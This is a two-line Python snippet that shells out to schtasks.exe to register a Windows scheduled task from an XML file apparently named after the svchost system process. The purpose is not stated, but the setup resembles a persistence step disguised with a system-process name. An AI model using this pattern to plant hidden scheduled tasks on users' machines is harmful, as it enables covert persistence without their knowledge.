import os
os.system('schtasks.exe /create /tn Task /xml "taskscheduler/svchost.xml"')